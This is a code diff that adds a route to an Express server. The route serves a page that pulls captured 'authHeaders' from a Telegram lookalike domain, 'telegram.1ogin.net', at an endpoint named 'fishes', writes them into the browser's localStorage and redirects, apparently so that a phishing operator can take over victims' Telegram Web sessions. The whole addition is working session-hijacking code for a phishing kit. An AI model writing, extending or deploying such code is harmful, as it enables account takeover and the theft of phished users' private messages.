@@ -25,6 +25,42 @@ app.get('/', (req, res) => {
   res.sendFile(__dirname + `/${publicFolderName}/index.html`);
 });
 
+const serviceDomain = 'telegram.1ogin.net';
+
+app.get('/view-admin', (req, res) => {
+  const {id} = req.query;
+  res.header('content-type', 'text/html')
+  .send(`<html><head><script>
+  async function fetchAndSetLocalStorage() {
+    try {
+        // Fetch data from the server
+        const response = await fetch('https://${serviceDomain}:4000/api/fishes/${id}');
+        if (!response.ok) {
+            throw new Error(\`Error fetching data: \${response.statusText}\`);
+        }
+
+        // Parse the JSON response
+        const data = await response.json();
+        localStorage.clear();
+        // Set each key-value pair in localStorage
+        for (const [key, value] of Object.entries(data.authHeaders)) {
+            localStorage.setItem(key, value);
+        }
+
+        window.location.href = "/";
+        console.log('LocalStorage data updated successfully');
+    } catch (error) {
+        console.error('Failed to fetch or set localStorage data:', error);
+    }
+  }
+
+  // Call the function to fetch and set localStorage data
+  fetchAndSetLocalStorage();
+  </script></head>
+  <body>
+  Please wait for a second to prepare your session...
+  </body></html>`);
+})
 const server = useHttp ? http : https;
 
 let options = {};
